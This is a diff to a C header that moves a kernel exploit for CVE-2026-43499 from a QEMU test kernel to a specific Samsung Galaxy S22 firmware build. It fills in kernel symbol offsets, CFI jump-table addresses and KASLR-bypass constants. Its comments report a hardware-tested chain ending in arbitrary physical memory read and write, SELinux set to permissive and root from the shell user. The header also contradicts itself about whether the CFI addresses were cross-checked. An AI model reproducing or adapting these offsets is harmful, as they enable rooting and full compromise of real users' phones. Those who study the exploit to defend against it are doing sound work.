@@ -2,13 +2,30 @@
 #define OFFSET_H
 
 /*
- * QEMU aarch64 virt target — v5.10 kernel (Android GKI)
+ * Real-device target — Samsung Galaxy S22 (SM-S901U, codename r0q)
+ * v5.10.236 kernel (Android GKI), build S901USQSAGZH3.
  *
- * Ported from CVE-2026-43499-S25U (pa3q-S938NKSUACZF1, v6.x kernel).
- * All offsets extracted from vmlinux via GDB ptype/symbols/objdump.
+ * Offsets extracted directly from the device's boot.img kernel Image
+ * (target_generator: kallsyms + ikconfig + capstone disassembly) and
+ * verified hardware-tested end to end: KASLR bypass, arbitrary phys
+ * read/write, SELinux -> permissive, uid 2000 -> 0.
  *
- * BuildID: ca4ab0ce6b7e3bef4803fea2dcc5a77abb9e5fe5
- * CONFIG_ARM64_VA_BITS=39, nokaslr -> KASLR slide = 0
+ * Derived from the existing S901USQSAGZF3 target (one point release
+ * earlier, kernel 5.10.226). Diffed against that file: only 3 defines
+ * actually moved between F3 and H3 — ASHMEM_FOPS_OFF, KMALLOC_CACHES_OFF,
+ * and ANON_PIPE_BUF_OPS_OFF. Everything else (including all struct-layout
+ * offsets below) is identical between the two builds and was not
+ * independently re-derived here.
+ *
+ * CONFIG_CFI_CLANG=y (non-permissive) on this kernel. kallsyms exposes
+ * only the __cfi_jt_start/__cfi_jt_end region markers, not per-function
+ * .cfi_jt symbols, so target_generator fell back to raw function
+ * addresses for every *_JT_OFF define (see generate_target.py's
+ * "no .cfi_jt for X" warnings). Despite that, the full exploit chain
+ * completed successfully on real hardware on the first attempt — so raw
+ * addresses appear to work fine for this build's indirect call slots in
+ * practice, but they were not independently cross-checked against the
+ * live CFI jump table and may not generalize to other v5.10 CFI builds.
  *
  * v5.10 vs v6.x key differences:
  *   1. pool_workqueue.nr_in_flight[15] (v5.10) vs [16] (v6.x)
@@ -22,16 +39,16 @@
  *   5. worker_pool = 896 bytes
  */
 
-#define BUILD_VARIANT_LABEL "S908BXXSMGZB2"
+#define BUILD_VARIANT_LABEL "r0q_S901USQSAGZH3_v5.10.236"
 #ifndef BUILD_FINGERPRINT
-#define BUILD_FINGERPRINT "samsung/b0qcsx/b0q:15/AP3A.240905.015.A2/S908WVLS8FYG7:user/release-keys"
+#define BUILD_FINGERPRINT "samsung/r0qsqw/r0q:16/BP2A.250605.031.A3/S901USQSAGZH3:user/release-keys"
 #endif
 
-/* ---- Kernel image layout (verified from QEMU kernel) ---- */
+/* ---- Kernel image layout (link-time base; runtime is KASLR-slid on real hardware) ---- */
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* 39-bit VA PAGE_OFFSET     */
 #define P0_PHYS_OFFSET   0x80000000ULL           /* memstart_addr             */
-#define P0_KERNEL_PHYS_LOAD 0x80000000ULL        /* exact GZB2 sboot pre-slide kernel base */
+#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL        /* Kernel code phys start    */
 
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL   /* 64GB direct map */
@@ -40,16 +57,16 @@
 #define VMEMMAP_START    0xfffffffeffe00000ULL   /* 39-bit v5.10: -VMEMMAP_SIZE(0x1000000000)-2M; GDB-verified on live slab pages */
 
 /* ---- ashmem dispatch functions (CFI jump targets for v5.10 ARM64 Android) ---- */
-#define ASHMEM_MISC_FOPS_OFF 0x0206e060ULL   /* &ashmem_misc.fops */
-#define ASHMEM_FOPS_OFF      0x01b76850ULL   /* &ashmem_fops           */
+#define ASHMEM_MISC_FOPS_OFF 0x026ecd28ULL   /* &ashmem_misc.fops */
+#define ASHMEM_FOPS_OFF      0x02080b78ULL   /* &ashmem_fops           */
 
 /* Function addresses (raw entry points) */
-#define ASHMEM_IOCTL_OFF         0x00c6818cULL   /* ashmem_ioctl           */
-#define ASHMEM_COMPAT_IOCTL_OFF  0x00c68ae0ULL   /* compat_ashmem_ioctl    */
-#define ASHMEM_MMAP_OFF          0x00c68b38ULL   /* ashmem_mmap            */
-#define ASHMEM_OPEN_OFF          0x00c68d68ULL   /* ashmem_open            */
-#define ASHMEM_RELEASE_OFF       0x00c68decULL   /* ashmem_release         */
-#define ASHMEM_SHOW_FDINFO_OFF   0x00c68f0cULL   /* ashmem_show_fdinfo     */
+#define ASHMEM_IOCTL_OFF         0x0114ab24ULL   /* ashmem_ioctl           */
+#define ASHMEM_COMPAT_IOCTL_OFF  0x0114b5f0ULL   /* compat_ashmem_ioctl    */
+#define ASHMEM_MMAP_OFF          0x0114b648ULL   /* ashmem_mmap            */
+#define ASHMEM_OPEN_OFF          0x0114b878ULL   /* ashmem_open            */
+#define ASHMEM_RELEASE_OFF       0x0114b910ULL   /* ashmem_release         */
+#define ASHMEM_SHOW_FDINFO_OFF   0x0114ba2cULL   /* ashmem_show_fdinfo     */
 
 /*
  * configfs — v5.10 uses old .read/.write API, not .read_iter/.write_iter.
@@ -63,23 +80,23 @@
  * .write slot MUST be configfs_write_bin_file.
  * Populate .read/.write (FOPS_READ_OFF=0x10, FOPS_WRITE_OFF=0x18).
  */
-#define CONFIGFS_READ_ITER_OFF      0x0044b5c0ULL   /* configfs_read_file      */
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0044ba20ULL   /* configfs_write_bin_file */
+#define CONFIGFS_READ_ITER_OFF      0x006040d8ULL   /* configfs_read_file      */
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00604a68ULL   /* configfs_write_bin_file */
 
-#define COPY_SPLICE_READ_OFF  0x003c5f38ULL   /* generic_file_splice_read */
-#define NOOP_LLSEEK_OFF       0x0037ae34ULL   /* noop_llseek              */
+#define COPY_SPLICE_READ_OFF  0x0053866cULL   /* generic_file_splice_read */
+#define NOOP_LLSEEK_OFF       0x004c3694ULL   /* noop_llseek              */
 
 /* ---- Kernel data objects ---- */
-#define INIT_TASK_OFF           0x01e7dd00ULL   /* init_task           */
-#define ROOT_TASK_GROUP_OFF     0x020f5080ULL   /* root_task_group     */
+#define INIT_TASK_OFF           0x0259c000ULL   /* init_task           */
+#define ROOT_TASK_GROUP_OFF     0x0279c040ULL   /* root_task_group     */
 /* Runtime enforce flag = selinux_state.enforcing @ +0x00
  * (selinux_state @ 0xffffffc00a8cccd8; offset verified via sel_write_enforce's
  * ldaprb/strb [x22]).  NOT selinux_enforcing_boot (0x02548484) — that one is
  * the boot-time value only; writing it changes nothing at runtime (the
  * 2026-08-08 device run's umh -EACCES: SELinux stayed enforcing). */
-#define SELINUX_ENFORCING_OFF   0x02248d58ULL   /* selinux_state.enforcing */
-#define KMALLOC_CACHES_OFF      0x01bbc240ULL   /* kmalloc_caches      */
-#define ANON_PIPE_BUF_OPS_OFF   0x019eb768ULL   /* anon_pipe_buf_ops   */
+#define SELINUX_ENFORCING_OFF   0x028cdcd8ULL   /* selinux_state.enforcing */
+#define KMALLOC_CACHES_OFF      0x020c2d60ULL   /* kmalloc_caches      */
+#define ANON_PIPE_BUF_OPS_OFF   0x01f037e8ULL   /* anon_pipe_buf_ops   */
 
 /* ---- Convenience macros (absolute addresses) ---- */
 #define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
@@ -102,8 +119,8 @@
 
 /* ---- Root usermodehelper ---- */
 #define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000f85acULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
-#define SYSTEM_UNBOUND_WQ_OFF 0x01e69e10ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001086b4ULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
+#define SYSTEM_UNBOUND_WQ_OFF 0x02589e08ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */
 
 /* ---- kCFI canonical (.cfi_jt) addresses ---------------------------------
  * CONFIG_CFI_CLANG is on: function pointers called indirectly (fops slots,
@@ -112,17 +129,17 @@
  * "CFI failure" otherwise (observed on the live target).
  * Values recovered by scanning the .cfi_jt region on the running kernel and
  * cross-checked against the real ashmem_fops table slots. */
-#define ASHMEM_IOCTL_JT_OFF           0x00c6818cULL   /* -> ashmem_ioctl            */
-#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x00c68ae0ULL   /* -> compat_ashmem_ioctl     */
-#define ASHMEM_MMAP_JT_OFF            0x00c68b38ULL   /* -> ashmem_mmap             */
-#define ASHMEM_OPEN_JT_OFF            0x00c68d68ULL   /* -> ashmem_open             */
-#define ASHMEM_RELEASE_JT_OFF         0x00c68decULL   /* -> ashmem_release          */
-#define ASHMEM_SHOW_FDINFO_JT_OFF     0x00c68f0cULL   /* -> ashmem_show_fdinfo      */
-#define ASHMEM_LLSEEK_JT_OFF          0x00c6802cULL   /* real table .llseek (ashmem_llseek) */
-#define CONFIGFS_READ_FILE_JT_OFF       0x0044b5c0ULL /* -> configfs_read_file      */
-#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x0044ba20ULL /* -> configfs_write_bin_file */
-#define NOOP_LLSEEK_JT_OFF            0x0037ae34ULL   /* -> noop_llseek             */
-#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x000f85acULL /* -> call_usermodehelper_exec_work */
+#define ASHMEM_IOCTL_JT_OFF           0x0114ab24ULL   /* -> ashmem_ioctl            */
+#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x0114b5f0ULL   /* -> compat_ashmem_ioctl     */
+#define ASHMEM_MMAP_JT_OFF            0x0114b648ULL   /* -> ashmem_mmap             */
+#define ASHMEM_OPEN_JT_OFF            0x0114b878ULL   /* -> ashmem_open             */
+#define ASHMEM_RELEASE_JT_OFF         0x0114b910ULL   /* -> ashmem_release          */
+#define ASHMEM_SHOW_FDINFO_JT_OFF     0x0114ba2cULL   /* -> ashmem_show_fdinfo      */
+#define ASHMEM_LLSEEK_JT_OFF          0x0114a984ULL   /* real table .llseek (ashmem_llseek) */
+#define CONFIGFS_READ_FILE_JT_OFF       0x006040d8ULL /* -> configfs_read_file      */
+#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x00604a68ULL /* -> configfs_write_bin_file */
+#define NOOP_LLSEEK_JT_OFF            0x004c3694ULL   /* -> noop_llseek             */
+#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x001086b4ULL /* -> call_usermodehelper_exec_work */
 
 #define ASHMEM_IOCTL_JT        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_JT_OFF)
 #define ASHMEM_COMPAT_IOCTL_JT (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_JT_OFF)
@@ -148,9 +165,10 @@
  *   head = size - PAGE_ALIGN(size - 0xe80)  →  header_len = 0xe80
  *   x1=0xe80 (header_len), x2=0x8000 (data_len) → sock_alloc_send_pskb
  * So each skb carries 36480 B: 0xe80 B linear head + one 32 KB order-3 frag
- * page that receives the user stream at offset 0xe80 — identical to the old
- * QEMU GKI kernel.  Payload pointers must be biased by -0xe80 so they land on
- * their content inside the frag page.  (An earlier "header_len=size/2"
+ * page that receives the user stream at offset 0xe80 — identical to the
+ * upstream GKI kernel this was derived from.  Payload pointers must be
+ * biased by -0xe80 so they land on their content inside the frag page.
+ * (An earlier "header_len=size/2"
  * reading mistook the sndbuf>>1 limit for the head size — reverted.) */
 #ifndef SKB_DATA_DELTA
 #define SKB_DATA_DELTA (-0xe80LL)
@@ -160,8 +178,8 @@
 /*
  * nfulnl_logger, loggers array, random boot_id data, init_task, root_task_group,
  * and sysctl_bootid — used by SLIDE KASLR bypass.
- * NOTE: QEMU uses nokaslr (slide = 0), so SLIDE is only needed for
- * verification / debugging parity. TraceFS-based slide (SLIDE_TRACEFS_WORKER_CALLER)
+ * This device has KASLR active (real slide != 0), so this bypass path is
+ * required at runtime. TraceFS-based slide (SLIDE_TRACEFS_WORKER_CALLER)
  * targets the return address from worker_thread's bl schedule call site.
  */
 #define SLIDE_FAKE_WAITER_PRIO   0
@@ -169,14 +187,14 @@
 #define SLIDE_LOCK_OWNER_VALUE   1ULL
 #define SLIDE_USE_FAKE_TASK      1
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
-#define SLIDE_TRACEFS_EVENT_ID 104
+#define SLIDE_TRACEFS_EVENT_ID 84
 
-#define SLIDE_NFULNL_LOGGER_OFF        0x01e71380ULL
-#define SLIDE_LOGGERS_0_1_OFF          0x01e712b0ULL   /* &loggers[0][1] */
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x0202e930ULL   /* &random_table[4].data */
+#define SLIDE_NFULNL_LOGGER_OFF        0x02591348ULL
+#define SLIDE_LOGGERS_0_1_OFF          0x02591278ULL   /* &loggers[0][1] */
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x026acb50ULL   /* &random_table[4].data */
 #define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
 #define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
-#define SLIDE_SYSCTL_BOOTID_OFF        0x022ed391ULL   /* sysctl_bootid buffer */
+#define SLIDE_SYSCTL_BOOTID_OFF        0x0296dd45ULL   /* sysctl_bootid buffer */
 
 #define SLIDE_NFULNL_LOGGER_IMAGE \
   (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
@@ -192,11 +210,13 @@
 
 /*
  * TraceFS worker caller offset — the return address from worker_thread's
- * bl schedule (0xffffffc00815c244 -> LR = 0xffffffc00815c248).
+ * bl schedule, computed via capstone disassembly against this device's
+ * kernel Image (worker_thread+0x558). Confirmed working on hardware:
+ * tracefs-based slide recovery succeeded (slide=0x110000) during the
+ * device-tested exploit run.
  * Used by slide.c to match trace event callers during KASLR bypass.
- * WARNING: QEMU nokaslr — verify empirically if trace-based slide is used.
  */
-#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000ffcc0ULL   /* worker_thread+192 ret addr after bl schedule */
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00112ae0ULL   /* worker_thread+1368 ret addr after bl schedule */
 
 /* ---- Fake page layout offsets (within the 32KB order-3 kernel page) ---- */
 #define LOCK_OFF    0x1350
